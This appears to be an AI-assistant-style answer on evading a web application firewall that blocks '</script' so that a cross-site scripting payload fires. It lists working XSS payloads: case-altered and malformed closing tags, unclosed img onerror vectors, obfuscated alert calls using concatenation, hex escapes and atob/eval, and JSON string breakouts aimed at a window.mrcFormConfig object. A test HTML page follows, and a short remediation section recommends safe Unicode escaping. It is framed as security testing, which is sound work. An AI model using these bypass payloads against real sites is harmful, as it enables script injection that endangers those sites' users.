If a Web Application Firewall (WAF) blocks the literal string </script, you cannot use it to close the tag. However, you can still trigger a pop-up alert by pivoting away from trying to close the script block manually. Instead, you trick the browser's HTML parser into handling the structure for you, or you avoid using the <script> keyword entirely. [1, 2] 
Here are the primary techniques used in security testing to trigger a pop-up when </script is blocked.
## 1. The Capitalization / Semicolon Trick
Some firewalls specifically look for the lowercase pattern </script. Because HTML tags are case-insensitive to web browsers, you can modify the casing. Combine this with your obfuscated alert payloads: [1, 3, 4, 5] 

* Mixed Case + Concatenation:
```
</Script><img src=x onerror="window['al'+'ert'](1)">
```
* Trailing Slash + Hex Obfuscation:
```
</SCRIPT/><img src=x onerror="window['al\x65rt'](1)">
```

## 2. Leaving the Tag Intentionally Unclosed (Parser Takeover)
Browsers are highly forgiving of malformed HTML. If you output a new HTML tag with an execution handler but omit the closing bracket >, the browser will read forward until it finds a bracket or the end of the script block to close it dynamically. [1, 4] 

* The Left-Open Image Tag:
```
<img src=x onerror="window['al'+'ert'](1)" <
```
* The Double Open-Bracket Vector:
```
<<img src=x onerror="Function('ale'+'rt(1)')()">
```
(The browser discards the first broken < and parses the second one.) [4] 

## 3. Overriding the Context (The </ Bypass)
If the WAF flags the specific text string </script, it might completely ignore a generic closing tag or a broken closing sequence. Some browsers will terminate the active script block if they encounter an abrupt HTML comment closure or generic tag termination: [2] 

* Generic Closing Tag:
```
</><img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```
* Malformed End Tag:
```
</ script><img src=x onerror="window['al'+'ert'](1)">
```

## 4. JavaScript Syntax Escape (No HTML Needed)
If your input lands inside the window.mrcFormConfig object from your previous step, you do not need to use </script at all. You can just break out of the JSON string using JavaScript logic, keeping the code safely contained inside the existing, valid <script> tag that the server already generated. [6] 

* The Semicolon Injection:
```
"}; window['al'+'ert'](1); //
```
* The Logical OR Injection:
```
" || window['al\x65rt'](1) || "
```

## HTML Editor Test Script
To verify how these work without triggering an external firewall, paste this template block into your HTML editor to observe which variations the browser executes:
```
<!DOCTYPE html>
<html>
<body>

  <!-- Test 1: Simulating an unclosed tag takeover -->
  <div>
    <img src=x onerror="window['al'+'ert']('Unclosed Tag Success')" <
  </div>

  <!-- Test 2: Simulating the Case Evasion -->
  <script type="text/javascript">
    window.mrcFormConfig = {"type": "wizard </Script><img src=x onerror='window[\"al\"+\"ert\"](\"Case Bypass\")'>"};
  </script>

</body>
</html>
```
## Remediation
Blocking strings like </script via a WAF rule is a brittle defense strategy because browsers dynamically repair malformed HTML structures to keep web pages rendering. [1] 
The definitive architectural fix is to pass the data into the form configuration using a secure JSON encoder that automatically enforces safe Unicode escaping: [5] 

* It transforms any literal < character into its harmless Unicode escape sequence \u003c.
* The browser's HTML parser will treat \u003c/script\u003e as a literal string value rather than an HTML closing directive, neutralising the injection entirely.


[1] [https://www.acunetix.com](https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/)
[2] [https://www.secjuice.com](https://www.secjuice.com/bypassing-web-application-firewalls-for-cross-site-scripting/)
[3] [https://medium.com](https://medium.com/@ahmedbelahcen2018/bypassing-xss-protection-thinking-beyond-script-775ff6e5ef62)
[4] [https://ally-petitt.com](https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/)
[5] [https://medium.com](https://medium.com/@yee-yore/waf-bypass-technique-part-2-5fc08a05a868)
[6] [https://stackoverflow.com](https://stackoverflow.com/questions/37435077/execute-javascript-for-xss-without-script-tags)
